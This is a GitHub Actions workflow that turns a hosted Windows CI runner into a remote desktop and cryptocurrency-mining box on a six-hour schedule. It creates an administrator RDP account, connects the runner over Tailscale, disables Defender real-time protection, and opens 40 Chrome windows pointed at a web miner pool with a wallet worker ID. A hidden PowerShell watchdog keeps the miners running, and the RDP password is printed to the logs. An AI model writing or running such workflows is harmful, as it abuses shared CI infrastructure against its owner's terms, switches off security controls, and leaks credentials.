name: RDP Auto-Recreate + Ultra Mining

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"   # ÙƒÙ„ 6 Ø³Ø§Ø¹Ø§Øª

env:
  RDP_USER: "RDPUser"
  MAX_RUNTIME: 340          # 5h40m

jobs:
  rdp_mining:
    runs-on: windows-latest
    timeout-minutes: ${{ env.MAX_RUNTIME }}

    steps:
      - name: Enable RDP
        run: |
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: Create RDP User
        run: |
          $password = $env:RDP_PASSWORD
          $secure = ConvertTo-SecureString $password -AsPlainText -Force

          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
            New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
            Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          } else {
            Set-LocalUser -Name $env:RDP_USER -Password $secure
          }

          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
        env:
          RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"

          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer

      - name: Connect Tailscale
        run: |
          Start-Service Tailscale
          Start-Sleep -Seconds 5
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --reset --authkey ${{ secrets.TAILSCALE_AUTH_KEY }} --hostname "GH-RDP-${{ github.run_id }}"
          $ip = (& "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4)
          echo "TS_IP=$ip" >> $env:GITHUB_ENV
          Write-Host "Tailscale IP: $ip"

      - name: Optimize Windows
        run: |
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN
          Set-MpPreference -DisableRealtimeMonitoring $true

      - name: Ultra Chrome Mining (20 Windows + 20 Headless)
        run: |
          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
          if (-Not (Test-Path $chromePath)) {
            Write-Host "Installing Chrome..."
            winget install --id Google.Chrome --accept-package-agreements --accept-source-agreements
          }
          Start-Sleep -Seconds 5

          $baseWorker = "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E"
          $urlBase = "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&password=x&workers=1"

          New-Item -ItemType Directory -Path C:\Miner -Force | Out-Null
          $log = "C:\Miner\hashrate.log"

          # Launch 20 Windows + 20 Headless miners
          for ($i=1; $i -le 20; $i++) {
            $url = "$urlBase&worker=$baseWorker-$i"
            
            # Normal Kiosk window
            Start-Process $chromePath `
              --arg "--no-first-run" `
              --arg "--disable-popup-blocking" `
              --arg "--disable-extensions" `
              --arg "--kiosk" `
              --arg "--disable-renderer-backgrounding" `
              --arg "--start-maximized" `
              --arg "$url"

            # Headless
            Start-Process $chromePath `
              --arg "--headless=new" `
              --arg "--disable-gpu" `
              --arg "--no-sandbox" `
              --arg "--disable-software-rasterizer" `
              --arg "$url"

            Start-Sleep -Milliseconds 500
          }

          # Hashrate monitor + auto-restart
          $monitorScript = @'
          while ($true) {
            $timestamp = (Get-Date).ToString("HH:mm:ss")
            $count = (Get-Process chrome -ErrorAction SilentlyContinue).Count
            "$timestamp | Chrome Instances: $count" | Out-File -Append C:\Miner\hashrate.log
            if ($count -lt 10) {
              Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
                  --arg "--headless=new" `
                  --arg "--disable-gpu" `
                  --arg "--no-sandbox" `
                  --arg "--disable-software-rasterizer" `
                  --arg "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=AutoRecovery&password=x&workers=1"
            }
            Start-Sleep -Seconds 30
          }
'@
          $monitorFile = "C:\Miner\monitor.ps1"
          $monitorScript | Out-File $monitorFile -Encoding ascii
          Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $monitorFile"

      - name: Show RDP + Mining Info
        run: |
          Write-Host "==========================================="
          Write-Host "ðŸš€ RDP + Mining READY"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: $env:RDP_USER"
          Write-Host "Pass: $env:RDP_PASSWORD"
          Write-Host "Mining Workers: 40 (20 GUI + 20 Headless)"
          Write-Host "Duration: $env:MAX_RUNTIME min"
          Write-Host "==========================================="

      - name: Keep Alive
        run: |
          for ($i=0; $i -lt $env:MAX_RUNTIME; $i+=1) {
            Write-Host "RDP + Mining Active... $i / $env:MAX_RUNTIME min"
            Start-Sleep -Seconds 60
          }

      - name: Cleanup
        if: always()
        run: |
          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
          Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
          Remove-Item -Path C:\Miner -Recurse -Force -ErrorAction SilentlyContinue
          Write-Host "Cleanup completed."
